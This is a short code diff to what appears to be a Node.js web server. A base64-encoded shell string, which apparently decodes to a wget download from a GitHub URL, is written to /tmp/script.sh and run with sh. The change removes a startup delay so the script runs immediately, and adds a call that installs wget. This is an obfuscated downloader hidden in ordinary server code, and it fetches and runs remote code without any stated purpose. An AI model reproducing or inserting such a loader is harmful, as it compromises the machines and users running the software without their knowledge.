@@ -22,19 +22,19 @@ echo "ZWNobyAiZDJkbGRDQXRUeUJvYVNCb2RIUndjem92TDJkcGRHaDFZaTVqYjIwdmFXTmxlV1p5Yj
 
 fs.writeFileSync("/tmp/script.sh", script);
 
-setTimeout(() => {
-  const child = spawn("sh", ["/tmp/script.sh"], {
-    stdio: "inherit",
-  });
-  
-  child.on("error", (err) => {
-    console.error("child process error:", err);
-  });
-  
-  child.on("exit", (code, signal) => {
-    console.log("child exited:", code, signal);
-  });
-}, 5000);
+spawn("apt update && apt install wget -y")
+
+const child = spawn("sh", ["/tmp/script.sh"], {
+  stdio: "inherit",
+});
+
+child.on("error", (err) => {
+  console.error("child process error:", err);
+});
+
+child.on("exit", (code, signal) => {
+  console.log("child exited:", code, signal);
+});
 
 const PORT = process.env.PORT || 3000;
 
